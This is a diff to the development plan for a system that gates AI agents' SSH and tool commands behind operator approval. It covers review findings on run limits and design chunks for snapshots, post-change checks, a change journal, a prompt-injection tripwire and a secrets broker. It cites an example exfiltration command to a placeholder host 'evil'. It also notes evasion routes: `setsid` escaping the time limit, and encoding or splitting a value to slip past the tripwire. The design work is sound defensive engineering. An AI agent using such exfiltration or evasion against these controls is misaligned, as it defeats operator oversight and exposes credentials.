+  non-dict; the endpoints send `{}` for a corrupt stored limit; an MCP run
+  and a poll-path run whose claim carries `"run_limit": null` are both refused
+  and nothing runs.
+* **AF2 — the range check lives in the Python.** `5 <= seconds <= 300` and
+  `65 536 <= bytes <= 8 388 608` are checked where the JSON is parsed. Bash
+  `[ -lt ]` on an integer above 2^63 errors, and inside `if` that error counts
+  as false, so a huge value used to pass as `valid` and GNU `timeout` would
+  treat it as effectively unbounded. The bash layer stays as a second check
+  with a digit-length guard, so no oversized word ever reaches `[ -lt ]`.
+  Test: `seconds: 10**30` and `bytes: 10**30` are refused.
+
+`bash scripts/verify.sh`: `2689 passed, 22 skipped, 7 warnings in 564.62s (0:09:24)`.
+
+**Code round 1 (feature reviewer, 2026-11-10, `90c4df7` / `51fb2a8`): the
+design is implemented faithfully; three must-fixes before the security
+reviewer reads the gateway bash.** Read in full: `parse_run_limit` (three
+answers, `min()` per field, range-checked, `python3 -I`), the capability
+reported per request and only with GNU `timeout`, `run_dir_safe()` shared by
+the F5, F12 and F19 files (W1), `timeout -k 5` and `cap_raw | sanitize |
+cap_visible` with the `bytes + 1` probe, `PIPESTATUS[0]`, the one-round-trip
+claim by id (it always exits through `run_sanitized` → `finish`), and every
+inline interpreter on `python3 -I`. The full suite passes here **with gawk
+installed**: 2555 passed, 5 skipped.
+
+* **AD1 (must): a command that ignores SIGTERM is not marked `time`.** With
+  `-k 5`, GNU `timeout` sends SIGKILL after the grace period and exits **137**,
+  not 124 (checked here: `timeout -k 1 1 bash -c 'trap "" TERM; sleep 5'` →
+  137). The marker test is `rc -eq 124`, so the run that most needed the limit
+  ends with no `limit: time`, no "[ESHU limit: stopped …]" line and no
+  truncation flag. Accept 124 **or** 137 (with the same elapsed-time guard),
+  and add that test.
+* **AD2 (must): CI is red on `51fb2a8` (both Python jobs), although the suite
+  passes locally.** `feature-roadmap` is green on the same runner label, so
+  the difference is F19's. The likely cause: `ubuntu-latest` moved to Ubuntu
+  26 in October 2026, which ships the Rust coreutils (`uutils`) as
+  `timeout`. `timeout --version` then does not say "GNU coreutils", so
+  `RUN_LIMITS_CAP` is empty and every test expecting `run_limits: v1` (and
+  the F4 auto-approval tests) fails. **Confirm from the Actions log first.**
+  If it is that:
+  * the tests must not depend on the runner's `timeout` flavour. Give
+    `GatewaySandbox` a stub `timeout` whose `--version` is chosen per test, and
+    keep one test that a non-GNU `timeout` refuses a limited run;
+  * pin the workflow to `runs-on: ubuntu-24.04`, so the gateway tests do not
+    change under us (this was already on the list);
+  * say in the setup doc that a gateway whose `timeout` is not GNU
+    (Ubuntu 26's default, BusyBox) reports no capability, so its unattended
+    rows stay `pending` (`read-lane-no-limits`). That fails closed, but the
+    operator should know.
+* **AD3 (must): drop `docs/TOOLSHED_PLAN.md` from the branch.** It is not on
+  `feature-roadmap` or `master`; the merge commit `8865712` added it (899
+  lines, a 2026-11-06 draft plan). It has nothing to do with F19, and this
+  repo is public. Remove it in a normal commit, and ask the operator whether
+  the file is theirs and where it belongs.
+* **Nit:** `timeout --version | grep -q …` runs under `pipefail`. The output is
+  small enough that it does not race today, but capture it to a variable
+  first so the check cannot flip on an early `grep` exit.
+* **Noted:** the regenerated `static/dev/eshu-gateway-install.sh` answers the
+  security reviewer's F12 note N-b. Nothing regenerates it in the repo (not
+  `gen_installer.py`), so it will go stale again; make `gen_installer.py`
+  write it in a later change.
+
+After AD1–AD3, the gateway bash (`eshu-gateway.sh` and both installers) goes to
+the security reviewer (§ 2.6a).
+
+**Code round 2 (feature reviewer, 2026-11-10, `f75b40a`): approved; to the
+security reviewer for the gateway bash.** AD1: 124 or 137, with the
+elapsed-time guard, and tests both ways. AD2: the cause was confirmed from the
+Actions log (Ubuntu 26.04 image, uutils `timeout`); the sandbox now stubs
+`timeout --version`, a non-GNU test keeps the refusal, the setup note is
+written, and CI is green. The `ubuntu-24.04` pin is on `feature-roadmap` as
+`6d58006` (pushed over SSH, so no `workflow`-scoped token was needed); drop
+the local `chore/ci-pin-ubuntu-24-04`. AD3: the stray file is removed
+(`4a86f81`). Nit, optional: `case "$TIMEOUT_VERSION" in *'GNU coreutils'*)`
+avoids the last pipe completely.
+
+**Security reviewer — gateway bash (2026-11-10, `90c4df7` + `6b30707`):
+approved on two small conditions (AF1, AF2). The feature reviewer checks them
+with their tests; they don't need to come back to me.**
+
+What is right:
+* **Run limits:** three parse results, `min()` per field, and the first
+  limit sticks.
+* **The capability:**
+  * it is GNU `timeout` only and reported on every request;
+  * a limit on a gateway without GNU `timeout` is refused, not half-applied;
+  * uutils and BusyBox report none, so their unattended rows stay pending.
+* **W1:** one `run_dir_safe()` covers the F5, F12 and F19 files. The probe is
+  created only after the check passes, and an unsafe directory refuses a
+  limited run.
+* **The pipeline:**
+  * `cap_raw` bounds the raw stream before `sed` sees it;
+  * the probe holds only sanitized bytes, at most `bytes + 1`;
+  * the exit code comes from `PIPESTATUS[0]`;
+  * a time stop is 124 or 137 plus the elapsed-time guard, and "cut" is
+    decided by the probe's size, never by scanning the output.
+* **L3:** the MCP branch claims by id in the same round trip, checks the
+  command and ticket owner, and exits through `finish`. The poller never
+  gets these rows.
+* **N-b:** the three installers embed the script byte for byte, and the dev
+  installer now has F12 and F19.
+
+Conditions:
+* **AF1 (must): a row marked unattended with no usable limit must refuse,
+  not run without a limit.**
+  * `parse_run_limit` reads a missing or `null` `run_limit` as "absent",
+    which correctly means "a human approved this".
+  * But `/api/ticket` sends `run_limit: null` beside `unattended: true` when
+    the stored limit does not parse. `/api/request_status` drops the field
+    in the same case (`except …: pass`) while still sending
+    `unattended: true`.
+  * Either way the gateway runs without a limit, though the dashboard has
+    said this is an unattended row.
+
+  Fix, on both sides:
+  * the gateway's parser answers `invalid` when `unattended is True` and the
+    limit is not a valid dict;
+  * the poll loop also runs `parse_run_limit "$CLAIM_BODY"` after a claim,
+    as the MCP branch does;
+  * both endpoints send a marker the gateway refuses (an empty dict, for
+    example), never `null` and never nothing.
+
+  Test: an unattended row whose stored limit is corrupt is refused on the
+  MCP path and on the poll path.
+* **AF2 (must): do the range check in Python.**
+  * Python prints any size of integer. Bash `[ -lt ]` on a value over 2^63
+    fails with an error, and inside `if`/`||` that error counts as false. So
+    `[ "$secs" -lt 5 ] || [ "$secs" -gt 300 ]` lets a huge value through as
+    `valid`.
+  * GNU `timeout` treats a huge duration as effectively unbounded.
+  * Only the dashboard can send it, but L2's rule is "unparsable refuses".
+
+  Fix: check `5 <= s <= 300` and `65536 <= b <= 8388608` in the Python
+  that already parses the JSON, and keep the bash checks as a second layer.
+
+  Test: `seconds: 10**30` is refused.
+
+Should, on the next gateway-bash branch:
+* **AF3:** the session-signature check (around line 848) is still
+  `python3 -` with `SESSION_KEY` and `SESSION_KEY_PREV` passed in **argv**.
+  * Make it `python3 -I`, which the "all interpreters are `-I`" claim needs.
+  * Have Python read `/etc/eshu-session-key` and the `.prev` file itself.
+    A root process's argv can be read by every local user through `/proc`,
+    so the session key is exposed for the length of the check. This is from
+    before F19, but the line is being touched anyway.
+* **For the record:** a process that calls `setsid` still escapes the time
+  limit (the byte limit still holds). No read-lane verb does this, as
+  recorded in the design review.
+
+_(Moved here from § 9 at the merge, 2026-11-11.)_ **Design round 3 (feature reviewer, 2026-11-10): approved, with one fix (Q3).**
+Q1's redraw on `capture_tail` is right. So is the separate cut probe, which
+holds sanitized bytes only, stays bounded at `bytes + 1` and is
+trap-removed. Q2's `next_step` for unattended rows, read from the
+`unattended` column rather than the reason text, is right too.
+
+* **Q3 (must): the MCP branch must not `tee` to an unbounded file.**
+  `… | cap_visible | tee "$ESHU_MCP_CAP" >/dev/null` has no cap when no
+  `run_limit` is set, which is every human-approved MCP run. A large output
+  would grow `ESHU_MCP_CAP` on `/run` without limit. The security reviewer
+  asked for the same thing on the CI fix: F12's MCP capture moves to the
+  ring, with the 16385 as a parameter. Use `capture_tail "$ESHU_MCP_CAP" 65537`
+  here, so the envelope's 64 KiB rule still holds, with stdout to
+  `/dev/null`. Add a test: 2 MiB of MCP output with no run limit leaves a
+  capture file of at most 65537 bytes.
+* **Build on the buffering fix.** `fix/stream-unbuffered` (B1–B4) puts
+  `stdbuf -oL` on `sanitize`, and mawk gets `-W interactive`. F19's pipeline
+  uses that `sanitize` as it is (B4).
+
+After Q3, to the security reviewer for § 3 and § 4.
+
+---
+
+## Chunks F21–F26 — Safer changes, change history, agent trust
+
+Added 2026-11-10 from a separate review chat. They go ahead of the
+local-model work (F17 and the parked F20), which is now an experiment and
+comes last. Shared rules:
+
+* **Every read goes through `core/read_policy.py`** (§ 2.6a), as in F14–F16.
+* **Anything that runs with no human click** is an unattended run. It gets
+  F19's limits, and it runs only on a gateway that reports `run_limits: v1`.
+  On any other gateway it does not run, and the card says "not run", never
+  "passed".
+* **"Operator-approved exact bytes": the security reviewer's decision on
+  F15 AG1 (2026-11-10).** Under `ssh_mode=approval`, a plan item may be
+  claimed only when **server code** built its plan:
+  * the `origin` column is set by server code only, defaults to `agent`, and
+    no agent field can set it;
+  * agents cannot change the plan's items;
+  * each item names one host;
+  * the claim checks the session's owner;
+  * freeze, Zero-Trust and the blocklists still win.
+
+  What matters is who wrote the plan, not who approved it. This covers F15
+  probes. F16 recipe steps keep claiming by request id. **F22's check is not
+  covered:** it runs with no agent call and no human present, so it is an
+  unattended run under F19's limits. F22's design review decides whether it
+  gets an origin at all.
+* **No live data** in tests or fixtures (§ 2.5): TEST-NET addresses, made-up
+  vmids and names.
+
+---
+
+## Chunk F21 — Snapshot before approve · slug `snapshot-approve` · dashboard + Proxmox integration · **design first + security reviewer sign-off**
+
+### Goal
+
+When a write is about to run inside a Proxmox guest, the operator can choose
+"snapshot, then run". If it goes wrong, one click rolls the guest back.
+
+### Design (to confirm in the design note)
+
+* **When it is offered.** Only on a pending write request (F1 has at least
+  one write or unknown step) whose real target is a single Proxmox guest:
+  * the F7 inner target is `pct exec <vmid>` / `qm guest exec <vmid>` on a
+    gateway that is a Proxmox node; or
+  * the gateway itself is a guest. F14's inventory maps the gateway's IP to
+    exactly one Proxmox row (`source='proxmox'`, a `vmid`). Zero or several
+    matches mean no offer, with the reason shown.
+
+  The guest's node comes from `get_cluster_resources`, read through
+  `read_policy`. Proxmox host commands with no inner target get no offer: a
+  snapshot would not cover them.
+* **New Proxmox tools, not agent tools.** `snapshot_create`, `snapshot_list`,
+  `snapshot_rollback` and `snapshot_delete` cover `qemu` and `lxc`:
+  * `POST/GET /nodes/{node}/{type}/{vmid}/snapshot`;
+  * `POST …/snapshot/{name}/rollback`;
+  * `DELETE …/snapshot/{name}`.
+
+  They are seeded `internal: 1`. The MCP server never lists them, and
+  `run_tool` refuses them for every agent, including through a hidden-tool
+  call and the generic integration proxy. Only dashboard code paths run
+  them. A test calls each one as an agent and gets a refusal.
+* **"Snapshot, then run".** A second approve button.
+  1. The dashboard creates the snapshot:
+     * the name is `eshu-r<request id>-<unix ts>`;
+     * the description is `eshu request #N` plus the scrubbed first 80
+       characters of the command;
+     * `vmstate` is 0.
+  2. It polls the task's UPID until it finishes, with a time limit (default
+     120 s).
+  3. Only after the task succeeds does it approve the request.
+  4. If the snapshot fails or times out, the request stays **pending**, the
+     error is shown, and the operator can still approve without one. A
+     failed snapshot never approves anything.
+* **Recorded.** A new `snapshots` table:
+  * `request_id` / `plan_id`, `node`, `type`, `vmid`, `name`;
+  * `created_at`, `expires_at`;
+  * `state`: `active|rolled_back|deleted|expired|failed`;
+  * the operator.
+
+  The approval card and the request sidebar show it, with "Roll back" and
+  "Delete".
+* **Rollback and delete are operator-only.**
+  * A session-authenticated dashboard user only, CSRF-checked like every
+    other operator POST; never an agent token.
+  * A confirm dialog names the guest, says that the guest's disk returns to
+    the snapshot time, and that a running LXC is stopped and started again.
+  * Each action is audited.
+  * Before acting, the dashboard re-reads the snapshot list and checks that
+    a snapshot with that name and the eshu description still exists on that
+    vmid. This guards against vmid reuse (the F16 V4 lesson).
+* **Expiry.** A background job deletes snapshots past `expires_at`:
+  * the default is 72 h, and the setting ranges over 1 h–14 d;
+  * it deletes only rows in its own table that pass the same re-check, so
+    it can never delete a snapshot it did not make.
+
+  Thin-pool space: if `list_storages` reports the guest's storage above 85 %
+  used, the offer is shown with a warning (or hidden, if the design note
+  prefers).
+* **Freeze.** While frozen, no approval happens, so no snapshot is created.
+  Whether rollback stays available during a freeze (it is the recovery
+  button) is for the security reviewer to decide in the design note.
+* **Permissions.** The Proxmox token needs `VM.Snapshot`, and
+  `VM.Snapshot.Rollback` on PVE 8. A missing privilege shows on the
+  integration page as "snapshots unavailable", never as a failed approval.
+
+### Tests to add (outline)
+
+* The offer:
+  * an inner-target `pct exec` gets it;
+  * a gateway mapped to one guest gets it;
+  * zero or two inventory matches, or a Proxmox host command with no inner
+    target, do not.
+* Snapshot failure leaves the request pending; approval follows only a
+  finished task.
+* The four tools are refused to agents on every path.
+* Rollback and delete:
+  * an agent token, a missing CSRF token, or a snapshot that is gone or
+    renamed on the vmid each give a refusal and touch nothing;
+  * a reused vmid is caught by the re-check.
+* Expiry deletes only its own expired rows.
+* A stubbed Proxmox API throughout.
+
+### Compat impact
+
+Additive: a table, settings, and seeded internal tools. Integrations without
+the new tools show no offer. No gateway change.
+
+### Acceptance criteria
+
+The design note is signed off by the security reviewer; the tests above
+pass; on a test guest, snapshot → run → roll back → the guest is back to its
+snapshot state; and an expired snapshot is deleted by the job.
+
+### Implementer notes
+
+_(implementer)_
 
 ### Reviewer notes
 
 _(reviewer)_
+
+---
+
+## Chunk F22 — Changes carry a check · slug `change-checks` · dashboard + MCP · **security reviewer signs off the unattended check**
+
+### Goal
+
+Each change in a plan can say how to tell that it worked: "the unit is
+active", "port 443 is listening". Eshu runs that check right after the
+change and stops the plan if it fails.
+
+### Design (to confirm in the design note)
+
+* **A plan item may carry one `check`.** It is proposed with the item, shown
+  on the plan card, and approved with it. There are two kinds:
+  * `{kind: 'ssh', command}`: run on the item's host. It must pass
+    `is_read_ssh` when proposed **and** again when it runs. Success is exit
+    code 0.
+  * `{kind: 'tool', integration, tool, args, expect: {path, op, value}}`:
+    it must pass `is_read_integration_call`. The rest is fixed:
+    * `path` is a dotted JSON path of at most 4 parts;
+    * `op` is one of `eq|ne|in|lt|gt`;
+    * `value` is a string or number.
+
+    It is never a regex and never prose parsing.
+
+  Optional `wait_s` 0–30 and `retries` 0–3 cover services that take a moment
+  to start.
+* **When it runs.** The item's command reports its exit code (F5; this works
+  with `exit-only` capture). Then:
+  * a non-zero exit stops the plan with no check;
+  * an exit of 0 schedules the check.
+* **Who runs it.**
+  * An `ssh` check runs through the F12 runner under the item's agent, with
+    reason `plan-check:<plan>:<item>`, and with F19's limits.
+  * It is covered by the "operator-approved exact bytes" rule (see the
+    shared rules; F15's AG1) and needs no second click.
+  * On a gateway without `run_limits: v1`, the check is "not run", and the
+    plan pauses for the operator (not "passed").
+  * A `tool` check runs dashboard-side through `run_tool`'s read path.
+* **Result.** It is stored per item as `check_state`:
+  `passed|failed|not_run|skipped`, with the exit code or the compared value,
+  never the output.
+  * The session card and the plan view show it per change.
+  * A failed or not-run check stops the plan: the remaining items can no
+    longer be claimed (the plan status is `stopped`, and it is audited).
+  * The agent sees this in `session_plan` / `session_summary`, with the
+    failed check named.
+* **No new write path.** A check can only read. If it is not a read when it
+  runs (the policy changed, or the tool was reconfigured), it is `not_run`
+  and the plan stops.
+
+### Tests to add (outline)
+
+* A write as a check is refused at proposal.
+* A check that stops being a read before it runs ends as `not_run`, and the
+  plan stops.
+* Pass and fail by exit code, and by each `op`.
+* A failed item stops the plan before its check runs.
+* A failed check makes the next item unclaimable through the real
+  `receive_request`.
+* A gateway without `run_limits` gives `not_run`.
+* `wait_s`/`retries` are bounded, and an out-of-range value is refused.
+* The check is not run twice after a dashboard restart.
+
+### Compat impact
+
+Additive: optional columns on `session_plan_items` (`check_json`,
+`check_state`, `check_detail`). Plans without checks behave exactly as now.
+
+### Acceptance criteria
+
+The tests above pass; the security reviewer has signed off the unattended
+check path; and on a test gateway, a plan that restarts a unit with an
+`is-active` check shows "passed", and one with a broken unit stops at that
+item.
+
+### Implementer notes
+
+_(implementer)_
+
+### Reviewer notes
+
+_(reviewer)_
+
+---
+
+## Chunk F23 — Change journal tied to alerts · slug `change-journal` · dashboard only
+
+### Goal
+
+A per-host timeline of what Eshu changed, with that host's Pulse alerts next
+to it. It shows things like "this alert started four minutes after request
+#1234".
+
+### Design
+
+* **Sources, all read-only.**
+  * Requests on the host, including the rows whose F7 inner target is a
+    guest on it:
+    * the rows that ran (`approved`/`consumed`) and that F1 labels as having
+      a write or unknown step;
+    * with their F5 exit code and their session.
+  * Integration writes from the audit log (F10 actions, NPM and Proxmox
+    writes, F21 snapshots and rollbacks), mapped to a host through F14's
+    inventory.
+  * Pulse alerts (`list_alerts`, `scope=history`) for the resources that
+    F14's inventory maps to the host (by IP or by vmid). This is read
+    through `read_policy`, the same way as `core.inventory._call_tool`.
+* **View.** A "Changes" tab on the host page, plus a link from a request's
+  sidebar:
+  * one timeline with the last 7 days by default (a 1–30 day range);
+  * changes and alerts are shown with different marks;
+  * commands are shown through `scrub_string`, capped at 120 characters,
+    and the full text is in the sidebar.
+* **Tie-in.** An alert that **started** within 30 minutes after a change on
+  the same host gets a badge naming the change and the gap ("+4 min after
+  #1234"). If several changes came before it, the nearest one is named and
+  the rest are counted. This is shown as a hint; Eshu never states it as a
+  cause.
+* **Cost.** Pulse is read once per view and cached for 60 s. If Pulse is
+  missing or errors, the timeline still shows the changes, with "alerts
+  unavailable".
+* **API.** `GET /api/hosts/{ip}/changes?days=N` returns JSON, for the
+  operator only. It is not an MCP tool in this chunk; a later chunk can add
+  an agent tool.
+
+### Tests to add (outline)
+
+* A write on the host appears; a read, another host's write, and a
+  row that never ran do not.
+* An inner-target write on a guest shows on that guest's host.
+* An alert 4 minutes after a change gets the badge; one 40 minutes after,
+  or one before the change, does not.
+* Pulse down still shows changes.
+* Commands are scrubbed.
+* The Pulse read is refused if the tool is reconfigured as a non-read.
+
+### Compat impact
+
+Read-only. No migration beyond an optional index on
+`requests(target_ip, created_at)` if the design note measures a need for one
+on the live-DB copy.
+
+### Acceptance criteria
+
+The tests pass, and on the private live-DB copy the page builds for the
+busiest host in under 1 s (measured, kept out of the repo).
+
+### Implementer notes
+
+**Built as a modal, not a tab.** There is no per-host page to hang a tab on:
+hosts are rows in the Gateways table and the sidebar views are a fixed list
+(`VIEWS` in `app.js`), so a "Changes" tab would mean a new view, a route and a
+way back to the host. The row now carries a **Changes** chip next to
+**Remove**, and it opens a modal built like the Override one — same
+`.modal-overlay .widget` markup, same open/close helpers, a 7/14/30-day
+select. The request-sidebar link from the design is **not** built; a change row
+in the modal shows its request id and session, which is the same information
+in the other direction.
+
+Backend, `dashboard/core/change_journal.py`:
+
+* **Requests.** One query for `requests` rows on the host in the window
+  (joined to `request_results` for the F5 exit code and `sessions` for the
+  agent/goal), then filtered in Python: `status` in `EXECUTABLE_STATUSES`
+  (`approved`/`consumed`) and F1's `breakdown()` reporting at least one
+  `write` or `unknown` step. The F7 `inner_target` is shown on the row, so a
+  `pct exec 101 …` write on a node names the guest.
+* **Integration writes.** `integration_calls` rows with `outcome='ok'` whose
+  method is `POST`/`PUT`/`PATCH`/`DELETE`, or whose method is `WS` and whose
+  tool is not marked `read_only` (F10's actions are WS; a tool that has since
+  been deleted is not claimed as a change). Plus `audit_log` rows for
+  `AUDIT_CHANGE_EVENTS` — today `version_updated`, the gateway update Eshu
+  performed on that host. **Note for the reviewer:** `audit_log` has no row
+  per integration write; the per-call audit row is `integration_calls`, which
+  is where every executor records one. The constant is the single place to
+  extend when a later chunk starts writing host changes into `audit_log`.
+* **Mapping to a host, through F14.** `host_identities(ip)` is the IP, the
+  names/FQDNs of any inventory entity that claims it, and the names/VMIDs of
+  the guests whose `host` is this host. A call's host is its own
+  `host`/`resolved_ips` when set, else the integration's `base_url`; a Pulse
+  alert is matched on `resourceId`/`resourceName`/`node`/`id`. Matching is
+  boundary-aware, so `192.0.2.10` does not match `192.0.2.100` and vmid `104`
+  does not match `1040`.
+* **Pulse** is read through `core.inventory._call_tool`, which is the same
+  read-policy gate every inventory source goes through — a tool reconfigured
+  as a non-read is refused before anything is sent (tested). The result is
+  cached under the integration name for 60 s and filtered per host and
+  window, so opening two hosts is one upstream read. Any failure degrades to
+  `alerts_error` with the changes still shown.
+* **The tie-in** names the nearest change at or before an alert's
+  `startTime`, within 30 minutes, and counts the others; it is rendered as
+  "+4 min after #1234" and never as a cause.
+
+**Measured** on a synthetic DB (20 000 requests over 40 hosts and 30 days,
+2 000 on the busiest host, 2 000 integration calls, 500 alerts): `changes_for_host`
+takes **28 ms** for 7 days (493 changes, 107 alerts, 233 KB of JSON) and
+**149 ms** for 30 days (2 134 changes, 1.0 MB). The worst case — 2 000
+*distinct* commands on the host in 7 days, so F1 cannot reuse its cache — is
+**256 ms**. That is well inside the 1 s acceptance and the margin is large
+enough that a slower machine does not change the answer, so **no index is
+added**: `idx_requests_inner_target` already covers the `target_ip` prefix, and
+the query over 2 482 host rows takes 8 ms.
+
+The first measurement was 364 ms for 7 days because `integration_changes`
+looked up the integration (and, for WS rows, the tool) once **per call row** —
+an N+1. Both are now one lookup per integration and one per (integration,
+tool) pair; that is where the 13× came from.
+
+Tests, `tests/test_f23_change_journal.py` (29): the write appears; a read,
+another host's write, a never-run row and an out-of-window row do not; the
+unknown step counts; the inner target and the session are named; the command
+is scrubbed and capped; integration writes count, reads/errors/refusals do
+not; a WS write counts and a read-only WS tool does not; the gateway update
+comes from the audit log; an alert 4 minutes after a change is tied, 40
+minutes after is not, and one before is not; the nearest is named and the
+others counted; an alert on another host is not shown; Pulse down, missing and
+non-read all still show the changes; the read is cached; days are clamped; a
+bad host is refused and an unknown one is empty; the identity matcher is
+boundary-aware; the API is operator-only, returns the timeline, clamps 0/999
+and refuses a non-IP.
+
+Compat: read-only. No migration, no new table, no MCP tool.
+
+**Round 1 — AJ1 and AJ2 (2026-11-11).** Both folded in.
+
+* **AJ1.** A name now matches only as a whole label:
+  `(?<![A-Za-z0-9-])name(?![A-Za-z0-9-])`. The IP and vmid rule is unchanged
+  (`(?<![0-9.])…(?![0-9])`), so `192.0.2.10` still does not match
+  `192.0.2.100` and vmid `104` does not match `1040`. Tests: `pve` owns
+  `pve.example.net` and `pve:pve:104` and not `pve3` / `pve-backup` /
+  `pve-backup.example.net`; `web` does not own `webhook.example.net` but does
+  own `web.example.net`.
+* One thing the label rule alone does not fix, found while testing it: a
+  Pulse id is `<cluster>:<node>:<vmid>`, and the first segment is the cluster
+  prefix — usually literally `pve`. With the label rule, a host named `pve`
+  still owned every `pve:*` alert through that prefix, so `pve:pve3:104`
+  stayed on `pve`'s page. The id is now split on `:` and the first segment
+  dropped when there are three or more, so the node and vmid segments are
+  what match; `pve:pve:104` still belongs to `pve`, `pve:pve3:104` does not.
+  This is the same rule for the alert's own `id`, which in Pulse also carries
+  the resource id.
+* **AJ2.** `get_integrations()` without `include_secret`: the journal reads
+  `name` and `base_url` only, so the secret column is never loaded.
+* Round 2 tests: 33 in the file (four new), including an end-to-end case where
+  a guest named `web` sees its own alert and not `webhook`'s.
+
+`bash scripts/verify.sh`: `2798 passed, 22 skipped, 8 warnings in 591.62s (0:09:51)`.
+
+`bash scripts/verify.sh`: `2671 passed, 22 skipped, 7 warnings in 536.11s (0:08:56)`.
+
+
+### Reviewer notes
+
+_(reviewer)_
+
+**Round 1 (feature reviewer, 2026-11-11, at `bcf5f9a`): changes requested, AJ1–AJ2 (small).**
+
+The three sources, the tie-in, the cache, the read-policy gate and the
+escaping are right, and so is the modal instead of a tab. The timings
+(28 ms over 7 days, 256 ms worst case) are well inside the budget.
+
+* **AJ1 (must): names match as plain substrings.** `_owned` matches a
+  non-numeric identity anywhere in the text. A host whose inventory name is
+  `pve` therefore owns the alerts and integration writes of `pve3` and
+  `pve-backup`, a guest called `web` owns `webhook.example.net`, and a
+  two-letter name like `ha` owns almost everything. That makes false
+  "+N min after" ties. **Fix:** match a name only as a whole label:
+  `(?<![A-Za-z0-9-])name(?![A-Za-z0-9-])`, so `.` may follow, which keeps
+  `name.example.net`. Keep the IP/vmid rule as it is. **Test:** `pve` does
+  not own `pve3` or `pve-backup`, but does own `pve.example.net` and
+  `pve:pve:104`; `web` does not own `webhook.example.net`.
+* **AJ2 (should): `get_integrations(include_secret=True)`.** The journal
+  needs only `name` and `base_url`, so load without secrets.
+
+---
+
+## Chunk F24 — Untrusted-content tripwire · slug `content-tripwire` · dashboard · **design first + security reviewer sign-off**
+
+### Goal
+
+Content an agent reads is untrusted: a web page, a log line, a device name.
+When a later write request uses a value that first appeared in that content,
+the approval card says so. This catches the shape of a prompt injection
+without blocking anything.
+
+### Design (to confirm in the design note)
+
+* **Collect.** For each session, take what Eshu returns to the agent:
+  * F12 `ssh_exec` output;
+  * integration read bodies;
+  * `web_fetch` results;
+  * F15 digests.
+
+  From these, extract **candidate values**:
+  * IPs, hostnames and FQDNs, URLs, absolute paths, e-mail-like strings;
+  * any other run of at least 12 characters without spaces.
+
+  Store a keyed hash of each one, never the value:
+  * HMAC-SHA256 with a per-install key kept beside the session key;
+  * stored per session, with the source kind and the time first seen.
+* **Compare.** When a write request or a write tool call arrives in that
+  session, extract the same candidate values from its command or
+  arguments, hash them with the same key, and look them up. A hit flags the
+  request when the value:
+  * was first seen in untrusted content;
+  * was not in the operator's own plan text (an F3 plan, or an F11 diff the
+    operator saw);
+  * is not on the host's inventory record (F14). A value Eshu already knows
+    is not suspicious.
+* **Show, never block.** The card shows a yellow line, "this value first
+  appeared in `web_fetch` output 6 min ago", and the audit row records the
+  flag. Nothing is denied or delayed. The design note must keep this
+  promise, and must say how a flag stays useful without becoming noise.
+  The live data shows that the operator approves quickly; a measured flag
+  rate on the live-DB copy is part of the note.
+* **Retention.** The design note fixes:
+  * what is stored: hashes only, the source kind, and timestamps;
+  * the per-session caps (for example 5,000 hashes, oldest dropped first);
+  * the lifetime: the session's end + 24 h, then deleted by a job;
+  * that the HMAC key never leaves the dashboard host and is not in any
+    backup export.
+* **Threat model** (in the note): an injection that rewrites a value
+  (encoding, splitting) evades this. It is a tripwire for the common case,
+  not a guarantee, and the card text must not oversell it.
+
+### Tests to add (outline)
+
+* A URL first seen in `web_fetch` output and then used in a write command
+  is flagged.
+* The same URL in the operator's plan text is not flagged.
+* An inventory IP is not flagged.
+* A read is never flagged.
+* No raw value is stored: the table holds only hashes.
+* Expiry deletes the session's rows.
+* The cap drops the oldest hashes.
+* A flag never changes the request's status.
+
+### Compat impact
+
+Additive: one table and a background job. Nothing is blocked.
+
+### Acceptance criteria
+
+The design is signed off by the security reviewer, including the retention
+section; the tests pass; and the flag rate on the private live-DB copy is
+measured and reported (outside the repo).
+
+### Implementer notes
+
+_(implementer)_
+
+### Reviewer notes
+
+_(reviewer)_
+
+---
+
+## Chunk F25 — Secrets broker · slug `secrets-broker` · gateway + dashboard · **design first + security reviewer sign-off**
+
+### Goal
+
+Live traffic includes commands that pull a key out of a container into a
+shell variable, so that the agent sees the key. With a broker, the operator
+registers a named credential per host, and a command refers to it by name.
+The gateway puts the value in at run time, so the agent never sees it, and
+the output is scrubbed for it.
+
+### Design questions the note must answer
+
+* **Where the value lives.** The preferred option is on the gateway host
+  only:
+  * a root-owned `0600` file under `/etc/eshu/secrets/<name>`;
+  * or a registered source on that host, such as a fixed file inside a
+    named container, read by the gateway at run time.
+
+  The dashboard stores only the name, the host, a description, and a hash
+  for "has it changed". Storing the value on the dashboard and shipping it
+  per run is the alternative. The note must weigh it (an encrypted-at-rest
+  store, transport, and the dashboard as a single point of compromise) and
+  say why it was or was not chosen.
+* **How a command refers to it.**
+  * One fixed form, for example the word `@eshu-secret:<name>` standing
+    alone, resolved by the gateway into an environment variable that the
+    command reads as `"$ESHU_SECRET_<NAME>"`.
+  * It is never placed in argv. Any local user can read argv through
+    `/proc` (the F19 AF3 lesson).
+  * F1 labels the reference.
+  * F16's V1 rule applies: a reference is never a command word, and never
+    an argument of an exec-type verb.
+* **Approval.**
+  * The card shows each secret a command uses, in red.
+  * A command that uses a secret never runs unattended: no read lane, no
+    probe, and no F22 check. It runs only as a human-approved request or as
+    an approved plan item.
+  * Each secret may carry an allowlist of hosts it can be used on. The note
+    decides whether to add a per-secret allowlist of destinations (to stop
+    `curl evil -d "$ESHU_SECRET_X"`), and how that would be enforced.
+* **Output scrubbing.** The gateway scrubs the exact value, and its base64
+  and URL-encoded forms, from the output before `sanitize`. This uses a
+  fixed-string match, never a regex built from the value. A line that
+  contained the value is marked `[ESHU secret redacted]`.
+* **Logs.** The name may appear in Eshu's own audit log. The value must
+  never appear in:
+  * syslog (this needs security Chunk 7's no-sig-in-syslog fix first);
+  * the F5 result;
+  * the ticket;
+  * the lockbox file;
+  * the shell's own history.
+
+  The note lists each place a value could leak and how each is closed.
+* **Capability.** A new `secrets: v1` capability, reported per request as
+  F19 does. A gateway without it refuses any command with a reference.
+
+### Tests to add (outline)
+
+To be fixed in the design note. As a minimum:
+* the value never appears in argv, the F5 result, the ticket, the stored
+  output or any log;
+* the encoded forms are scrubbed;
+* a reference as a command word is refused;
+* an unknown name is refused;
+* a gateway without the capability refuses;
+* a secret-using command is never auto-run.
+
+### Compat impact
+
+New gateway code and a capability flag. Gateways without it refuse
+references, and all other commands behave as now.
+
+### Acceptance criteria
+
+The design note is signed off by the security reviewer; the gateway bash is
+reviewed line by line and re-signed off; and the tests pass under GNU and
+BusyBox (the F11 W5 matrix).
+
+### Implementer notes
+
+_(implementer)_
+
+### Reviewer notes
+
+_(reviewer)_
+
+---
+
